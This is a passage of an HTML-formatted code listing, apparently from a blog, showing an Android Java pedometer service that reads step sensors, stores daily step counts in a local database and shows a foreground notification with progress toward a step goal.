class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br></pre></td><td class="code"><pre><span class="line">public class StepService extends Service implements SensorEventListener &#123;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;TAG</span><br><span class="line">    private static String TAG &#x3D; &quot;StepService&quot;;</span><br><span class="line">    &#x2F;&#x2F;存储间隔</span><br><span class="line">    private static int duration &#x3D; 3000;</span><br><span class="line">    &#x2F;&#x2F;当前日期</span><br><span class="line">    private static String CURRENT_DATE &#x3D; &quot;&quot;;</span><br><span class="line">    &#x2F;&#x2F;传感器</span><br><span class="line">    private SensorManager sensorManager;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;广播--监听手机状态变化</span><br><span class="line">    private BroadcastReceiver mReceiver;</span><br><span class="line">    &#x2F;&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;倒计时</span><br><span class="line">    private TimeCount time;</span><br><span class="line">    &#x2F;&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;数据库操作</span><br><span class="line">    private StepsDao stepsDao &#x3D; DBUtil.getStepsDao();</span><br><span class="line">    &#x2F;&#x2F;当前步数</span><br><span class="line">    private int CURRENT_STEPS;</span><br><span class="line">    &#x2F;&#x2F;期望步数</span><br><span class="line">    private float EXPECT_STEPS;</span><br><span class="line">    &#x2F;&#x2F;计步传感器类型 0-counter 1-detector</span><br><span class="line">    private static  int stepSensor &#x3D; -1;</span><br><span class="line">    &#x2F;&#x2F;是否记录</span><br><span class="line">    private boolean hasRecord &#x3D; false;</span><br><span class="line">    &#x2F;&#x2F;已经走过的步数</span><br><span class="line">    private int hasStepCount &#x3D; 0;</span><br><span class="line">    &#x2F;&#x2F;以前走过的步数</span><br><span class="line">    private int previousStepCount &#x3D; 0;</span><br><span class="line">    &#x2F;&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;采用加速度传感器所要用到的变量</span><br><span class="line"></span><br><span class="line">    public static float SENSITIVITY &#x3D; 10; &#x2F;&#x2F; SENSITIVITY灵敏度</span><br><span class="line">    private float mLastValues[] &#x3D; new float[3 * 2];</span><br><span class="line">    private float mScale[] &#x3D; new float[2];</span><br><span class="line">    private float mYOffset;</span><br><span class="line">    private static long end &#x3D; 0;</span><br><span class="line">    private static long start &#x3D; 0;</span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 最后加速度方向</span><br><span class="line">     *&#x2F;</span><br><span class="line">    private float mLastDirections[] &#x3D; new float[3 * 2];</span><br><span class="line">    private float mLastExtremes[][] &#x3D; &#123; new float[3 * 2], new float[3 * 2] &#125;;</span><br><span class="line">    private float mLastDiff[] &#x3D; new float[3 * 2];</span><br><span class="line">    private int mLastMatch &#x3D; -1;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;messenger</span><br><span class="line">    &#x2F;&#x2F;跨进程通信--使用Messenger方式</span><br><span class="line">    private Messenger messengerFromService &#x3D; new Messenger(new MessengerHandler());</span><br><span class="line">    private  Messenger messengerFromClient;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    private class MessengerHandler extends Handler&#123;</span><br><span class="line">        @Override</span><br><span class="line">        public void handleMessage(Message msg) &#123;</span><br><span class="line">            super.handleMessage(msg);</span><br><span class="line">            switch (msg.what)&#123;</span><br><span class="line">                case Constants.MSG_FROM_CLIENT:</span><br><span class="line">                    messengerFromClient &#x3D; msg.replyTo;</span><br><span class="line">                    StepService.this.sendMessage();</span><br><span class="line">                    break;</span><br><span class="line">                default:</span><br><span class="line">                    break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;通知相关</span><br><span class="line">    private static final int NOTIFI_ID &#x3D; 100;</span><br><span class="line">    &#x2F;&#x2F;格式管理</span><br><span class="line">    private DecimalFormat df &#x3D; new DecimalFormat(&quot;#0.0&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void onCreate() &#123;</span><br><span class="line">        super.onCreate();</span><br><span class="line">        EXPECT_STEPS &#x3D; 8000f;</span><br><span class="line">        &#x2F;&#x2F;初始化广播</span><br><span class="line">        initBroadcastReceiver();</span><br><span class="line">        new Thread(new Runnable() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public void run() &#123;</span><br><span class="line">                &#x2F;&#x2F;获取传感器类型</span><br><span class="line">                startStepDetector();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">        startTimeCount();</span><br><span class="line">        initTodayData();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 取得今日日期</span><br><span class="line">     * @return</span><br><span class="line">     *&#x2F;</span><br><span class="line">    private String getTodayDate()&#123;</span><br><span class="line">        Date date &#x3D; new Date(System.currentTimeMillis());</span><br><span class="line">        SimpleDateFormat sdf &#x3D; new SimpleDateFormat(&quot;yyyy-MM-dd&quot;);</span><br><span class="line">        return sdf.format(date);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 初始化当天的步数</span><br><span class="line">     *&#x2F;</span><br><span class="line">    private void initTodayData() &#123;</span><br><span class="line">        CURRENT_DATE &#x3D; getTodayDate();</span><br><span class="line">        &#x2F;&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;在这里进行数据新的一列的存储</span><br><span class="line">        &#x2F;&#x2F;通过日期匹配，当数据中有今日步数的行，那么将步数值进行读取，如果没有那么久新增一行，并将CURRENT_STEP存储进去</span><br><span class="line">        QueryBuilder qb &#x3D; stepsDao.queryBuilder();</span><br><span class="line">        qb.where(StepsDao.Properties.Date.eq(getTodayDate()));</span><br><span class="line">        Steps steps &#x3D; (Steps) qb.unique();</span><br><span class="line">        if(steps!&#x3D;null)&#123;</span><br><span class="line">            CURRENT_STEPS &#x3D; steps.getUStep();</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            &#x2F;&#x2F;增加一行</span><br><span class="line">            Steps stepsAdd &#x3D; new Steps();</span><br><span class="line">            stepsAdd.setDate(CURRENT_DATE);</span><br><span class="line">            stepsAdd.setUStep(0);</span><br><span class="line">            stepsAdd.setHasUpLoad(false);</span><br><span class="line">            stepsDao.insert(stepsAdd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 获取当前步数占有率</span><br><span class="line">     *&#x2F;</span><br><span class="line">    private String getCurrentOccupancy()&#123;</span><br><span class="line">        &#x2F;&#x2F;默认8000，完善时在Service启动的时候进行复制</span><br><span class="line">        return df.format((float)CURRENT_STEPS&#x2F;EXPECT_STEPS*100);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 获取传感器实例</span><br><span class="line">     *&#x2F;</span><br><span class="line">    private void startStepDetector() &#123;</span><br><span class="line">        if(sensorManager!&#x3D;null)&#123;</span><br><span class="line">            sensorManager &#x3D; null;</span><br><span class="line">        &#125;</span><br><span class="line">        sensorManager &#x3D; (SensorManager) this.getSystemService(SENSOR_SERVICE);</span><br><span class="line">        addCountStepListener();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    Sensor countSensor ;</span><br><span class="line">    Sensor detectorSensor ;</span><br><span class="line">    Sensor accelerateSensor;</span><br><span class="line">    private void addCountStepListener() &#123;</span><br><span class="line">         countSensor &#x3D; sensorManager.getDefaultSensor(Sensor.TYPE_STEP_COUNTER);</span><br><span class="line">         detectorSensor &#x3D; sensorManager.getDefaultSensor(Sensor.TYPE_STEP_DETECTOR);</span><br><span class="line">        &#x2F;&#x2F;利用加速度传感器</span><br><span class="line">        accelerateSensor &#x3D; sensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER);</span><br><span class="line"></span><br><span class="line">        if(countSensor!&#x3D;null)&#123;</span><br><span class="line">            &#x2F;&#x2F;选择计步传感器</span><br><span class="line">            stepSensor &#x3D; 0;</span><br><span class="line">            Log.i(TAG,&quot;计步传感器&quot;);</span><br><span class="line">            sensorManager.registerListener(StepService.this,countSensor,SENSOR_DELAY_NORMAL);</span><br><span class="line">        &#125;else if(detectorSensor!&#x3D;null)&#123;</span><br><span class="line">            &#x2F;&#x2F;步数检测器</span><br><span class="line">            stepSensor &#x3D; 1;</span><br><span class="line">            Log.i(TAG,&quot;步数监测器&quot;);</span><br><span class="line">            sensorManager.registerListener(StepService.this,detectorSensor,SENSOR_DELAY_FASTEST);</span><br><span class="line">        &#125;else if(accelerateSensor !&#x3D; null)&#123;</span><br><span class="line">            stepSensor &#x3D; 2;</span><br><span class="line">            int h &#x3D; 480;</span><br><span class="line">            mYOffset &#x3D; h * 0.5f;</span><br><span class="line">            mScale[0] &#x3D; -(h * 0.5f * (1.0f &#x2F; (SensorManager.STANDARD_GRAVITY * 2)));</span><br><span class="line">            mScale[1] &#x3D; -(h * 0.5f * (1.0f &#x2F; (SensorManager.MAGNETIC_FIELD_EARTH_MAX)));</span><br><span class="line">            Log.i(TAG,&quot;加速度传感器&quot;);</span><br><span class="line">            sensorManager.registerListener(StepService.this,accelerateSensor,SENSOR_DELAY_FASTEST);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 传感器回调</span><br><span class="line">     * @param event</span><br><span class="line">     *&#x2F;</span><br><span class="line">    @Override</span><br><span class="line">    public void onSensorChanged(SensorEvent event) &#123;</span><br><span class="line">        if(stepSensor &#x3D;&#x3D; 0)&#123;</span><br><span class="line">            int tempStep &#x3D; (int) event.values[0];</span><br><span class="line">            if(!hasRecord)&#123;</span><br><span class="line">                hasRecord &#x3D; true;</span><br><span class="line">                hasStepCount &#x3D; tempStep;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                int thisStepCount &#x3D; tempStep -hasStepCount;</span><br><span class="line">                CURRENT_STEPS+&#x3D;(thisStepCount-previousStepCount);</span><br><span class="line">                previousStepCount &#x3D; thisStepCount;</span><br><span class="line">            &#125;</span><br><span class="line">            sendMessage();</span><br><span class="line">            setNotification();</span><br><span class="line">        &#125;else if(stepSensor &#x3D;&#x3D; 1)&#123;</span><br><span class="line">            if(event.values[0] &#x3D;&#x3D; 1.0)&#123;</span><br><span class="line">                hasRecord &#x3D; true;</span><br><span class="line">                CURRENT_STEPS++;</span><br><span class="line">                sendMessage();</span><br><span class="line">                setNotification();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else if(stepSensor &#x3D;&#x3D; 2)&#123;</span><br><span class="line">            hasRecord &#x3D; true;</span><br><span class="line">            synchronized (this) &#123;</span><br><span class="line">                float vSum &#x3D; 0;</span><br><span class="line">                for (int i &#x3D; 0; i &lt; 3; i++) &#123;</span><br><span class="line">                    final float v &#x3D; mYOffset + event.values[i] * mScale[1];</span><br><span class="line">                    vSum +&#x3D; v;</span><br><span class="line">                &#125;</span><br><span class="line">                int k &#x3D; 0;</span><br><span class="line">                float v &#x3D; vSum &#x2F; 3;</span><br><span class="line"></span><br><span class="line">                float direction &#x3D; (v &gt; mLastValues[k] ? 1</span><br><span class="line">                        : (v &lt; mLastValues[k] ? -1 : 0));</span><br><span class="line">                if (direction &#x3D;&#x3D; -mLastDirections[k]) &#123;</span><br><span class="line">                    &#x2F;&#x2F; Direction changed</span><br><span class="line">                    int extType &#x3D; (direction &gt; 0 ? 0 : 1); &#x2F;&#x2F; minumum or</span><br><span class="line">                    &#x2F;&#x2F; maximum?</span><br><span class="line">                    mLastExtremes[extType][k] &#x3D; mLastValues[k];</span><br><span class="line">                    float diff &#x3D; Math.abs(mLastExtremes[extType][k]</span><br><span class="line">                            - mLastExtremes[1 - extType][k]);</span><br><span class="line"></span><br><span class="line">                    if (diff &gt; SENSITIVITY) &#123;</span><br><span class="line">                        boolean isAlmostAsLargeAsPrevious &#x3D; diff &gt; (mLastDiff[k] * 2 &#x2F; 3);</span><br><span class="line">                        boolean isPreviousLargeEnough &#x3D; mLastDiff[k] &gt; (diff &#x2F; 3);</span><br><span class="line">                        boolean isNotContra &#x3D; (mLastMatch !&#x3D; 1 - extType);</span><br><span class="line"></span><br><span class="line">                        if (isAlmostAsLargeAsPrevious &amp;&amp; isPreviousLargeEnough</span><br><span class="line">                                &amp;&amp; isNotContra) &#123;</span><br><span class="line">                            end &#x3D; System.currentTimeMillis();</span><br><span class="line">                            if (end - start &gt; 500) &#123;&#x2F;&#x2F; 此时判断为走了一步</span><br><span class="line"></span><br><span class="line">                                CURRENT_STEPS++;</span><br><span class="line">                               sendMessage();</span><br><span class="line">                               setNotification();</span><br><span class="line">                                mLastMatch &#x3D; extType;</span><br><span class="line">                                start &#x3D; end;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; else &#123;</span><br><span class="line">                            mLastMatch &#x3D; -1;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    mLastDiff[k] &#x3D; diff;</span><br><span class="line">                &#125;</span><br><span class="line">                mLastDirections[k] &#x3D; direction;</span><br><span class="line">                mLastValues[k] &#x3D; v;</span><br><span class="line">            &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void onAccuracyChanged(Sensor sensor, int accuracy) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void sendMessage()&#123;</span><br><span class="line">        Message msg &#x3D; Message.obtain(null,Constants.MSG_FROM_SERVICE);</span><br><span class="line">        Bundle bundle &#x3D; new Bundle();</span><br><span class="line">        bundle.putInt(&quot;currentSteps&quot;,CURRENT_STEPS);</span><br><span class="line">        msg.setData(bundle);</span><br><span class="line">        try &#123;</span><br><span class="line">            if(hasRecord&amp;&amp;messengerFromClient!&#x3D;null) &#123;</span><br><span class="line">                messengerFromClient.send(msg);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 注册广播</span><br><span class="line">     *&#x2F;</span><br><span class="line">    private void initBroadcastReceiver() &#123;</span><br><span class="line">        final IntentFilter filter &#x3D; new IntentFilter();</span><br><span class="line">        &#x2F;&#x2F; 屏幕灭屏广播</span><br><span class="line">        filter.addAction(Intent.ACTION_SCREEN_OFF);</span><br><span class="line">        &#x2F;&#x2F;关机广播</span><br><span class="line">        filter.addAction(Intent.ACTION_SHUTDOWN);</span><br><span class="line">        &#x2F;&#x2F; 屏幕亮屏广播</span><br><span class="line">        filter.addAction(Intent.ACTION_SCREEN_ON);</span><br><span class="line">        &#x2F;&#x2F; 屏幕解锁广播</span><br><span class="line">        filter.addAction(Intent.ACTION_USER_PRESENT);</span><br><span class="line">        &#x2F;&#x2F; 当长按电源键弹出“关机”对话或者锁屏时系统会发出这个广播</span><br><span class="line">        &#x2F;&#x2F; 所以监听这个广播，当收到时就隐藏自己的对话，如点击pad右下角部分弹出的对话框</span><br><span class="line">        filter.addAction(Intent.ACTION_CLOSE_SYSTEM_DIALOGS);</span><br><span class="line">        &#x2F;&#x2F;监听日期变化</span><br><span class="line">        filter.addAction(Intent.ACTION_DATE_CHANGED);</span><br><span class="line">        filter.addAction(Intent.ACTION_TIME_CHANGED);</span><br><span class="line">        filter.addAction(Intent.ACTION_TIME_TICK);</span><br><span class="line"></span><br><span class="line">        mReceiver &#x3D; new BroadcastReceiver() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public void onReceive(Context context, Intent intent) &#123;</span><br><span class="line">                String action &#x3D; intent.getAction();</span><br><span class="line">                if(Intent.ACTION_SCREEN_ON.equals(action))&#123;</span><br><span class="line">                    Log.i(TAG,&quot;ScreenOn&quot;);</span><br><span class="line">                &#125; else if (Intent.ACTION_SCREEN_OFF.equals(action)) &#123;</span><br><span class="line">                    Log.i(TAG,&quot;ScreenOff&quot;);</span><br><span class="line">                    &#x2F;&#x2F;60s</span><br><span class="line">                    duration &#x3D; 6000;</span><br><span class="line">                &#125;else if (Intent.ACTION_USER_PRESENT.equals(action))&#123;</span><br><span class="line">                    Log.i(TAG,&quot;screen unlock&quot;);</span><br><span class="line">                    save();</span><br><span class="line">                    &#x2F;&#x2F;30s</span><br><span class="line">                    duration &#x3D; 3000;</span><br><span class="line">                &#125;else if(Intent.ACTION_SHUTDOWN.equals(action))&#123;</span><br><span class="line">                    Log.i(TAG,&quot;shutdown&quot;);</span><br><span class="line">                    save();</span><br><span class="line">                &#125;else if(Intent.ACTION_DATE_CHANGED.equals(action))&#123;</span><br><span class="line">                    save();</span><br><span class="line">                    isNewDay();</span><br><span class="line">                &#125;else if(Intent.ACTION_TIME_CHANGED.equals(action))&#123;</span><br><span class="line">                    save();</span><br><span class="line">                    isNewDay();</span><br><span class="line">                &#125;else if(Intent.ACTION_TIME_TICK.equals(action))&#123;</span><br><span class="line">                    save();</span><br><span class="line">&#x2F;&#x2F;                    isNewDay();</span><br><span class="line">                &#125;else if(&quot;ANewacount&quot;.equals(action))&#123;</span><br><span class="line"></span><br><span class="line">                    &#x2F;&#x2F;当时一个新用户登录的时候</span><br><span class="line">                    &#x2F;&#x2F;清除数据</span><br><span class="line">                    Log.i(TAG,&quot;收到新账户广播&quot;);</span><br><span class="line">                    initTodayData();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        registerReceiver(mReceiver,filter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 0点时初始化数据</span><br><span class="line">     *&#x2F;</span><br><span class="line">    private void isNewDay() &#123;</span><br><span class="line">        String time &#x3D; &quot;00:00&quot;;</span><br><span class="line">        if(time.equals(new SimpleDateFormat(&quot;HH:mm&quot;).format(new Date()))||(!CURRENT_DATE.equals(getTodayDate())))&#123;</span><br><span class="line">            initTodayData();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 存储到数据中去</span><br><span class="line">     *&#x2F;</span><br><span class="line">    private void save() &#123;</span><br><span class="line">        int tempStep &#x3D; CURRENT_STEPS;</span><br><span class="line">        QueryBuilder qb &#x3D; stepsDao.queryBuilder();</span><br><span class="line">        qb.where(StepsDao.Properties.Date.eq(getTodayDate()));</span><br><span class="line">        Steps steps &#x3D; (Steps) qb.unique();</span><br><span class="line">        &#x2F;&#x2F;不为空时，说明还未到12点，我们进行更新就行，为空说明为最后一次存储</span><br><span class="line">        if(steps!&#x3D;null)&#123;</span><br><span class="line">            steps.setUStep(tempStep);</span><br><span class="line">            steps.setDate(CURRENT_DATE);</span><br><span class="line">            stepsDao.update(steps);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            steps &#x3D; new Steps();</span><br><span class="line">            steps.setUStep(tempStep);</span><br><span class="line">            steps.setDate(CURRENT_DATE);</span><br><span class="line">            stepsDao.update(steps);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Nullable</span><br><span class="line">    @Override</span><br><span class="line">    public IBinder onBind(Intent intent) &#123;</span><br><span class="line">        return messengerFromService.getBinder();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public int onStartCommand(Intent intent, int flags, int startId) &#123;</span><br><span class="line">        setNotification();</span><br><span class="line">        return START_STICKY;</span><br><span class="line">        &#x2F;&#x2F;如果被系统kill掉，系统会自动将kill时的状态保留为开始状态，之后进行重连</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void setNotification() &#123;</span><br><span class="line">        PendingIntent pd &#x3D; PendingIntent.getActivity(this,0,new Intent(this, MainViewActivity.class),0);</span><br><span class="line">        &#x2F;&#x2F;在这里进行前台服务</span><br><span class="line">        Notification.Builder builder &#x3D; new Notification.Builder(this)</span><br><span class="line">                .setOngoing(true)</span><br><span class="line">                .setSmallIcon(R.drawable.poplog)</span><br><span class="line">                .setLargeIcon(BitmapFactory.decodeResource(this.getResources(),R.drawable.poplog))</span><br><span class="line">                .setContentTitle(&quot;当前步数&quot;+CURRENT_STEPS)</span><br><span class="line">                .setContentText(&quot;今日完成百分比&quot;+getCurrentOccupancy()+&quot;%&quot;)</span><br><span class="line">                .setWhen(System.currentTimeMillis())</span><br><span class="line">                .setContentIntent(pd);</span><br><span class="line">        startForeground(NOTIFI_ID,builder.build());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void onDestroy() &#123;</span><br><span class="line">        super.onDestroy();</span><br><span class="line">        &#x2F;&#x2F;取消前台进程</span><br><span class="line">        stopForeground(true);</span><br><span class="line">        unregisterReceiver(mReceiver);</span><br><span class="line">        &#x2F;&#x2F;注销各传感器</span><br><span class="line">        if(countSensor!&#x3D; null || detectorSensor !&#x3D; null || accelerateSensor !&#x3D; null)&#123;</span><br><span class="line">            sensorManager.unregisterListener(StepService.this);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 开始计时</span><br><span class="line">     *&#x2F;</span><br><span class="line">    private void startTimeCount() &#123;</span><br><span class="line">        time &#x3D; new TimeCount(duration,1000);</span><br><span class="line">        time.start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private class TimeCount extends CountDownTimer&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#x2F;**</span><br><span class="line">         * @param millisInFuture    The number of millis in the future from the call</span><br><span class="line">         *                          to &#123;@link #start()&#125; until the countdown is done and &#123;@link #onFinish()&#125;</span><br><span class="line">         *                          is called.</span><br><span class="line">         * @param countDownInterval The interval along the way to receive</span><br><span class="line">         *                          &#123;@link #onTick(long)&#125; callbacks.</span><br><span class="line">         *&#x2F;</span><br><span class="line">        public TimeCount(long millisInFuture, long countDownInterval) &#123;</span><br><span class="line">            super(millisInFuture, countDownInterval);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public void onTick(long 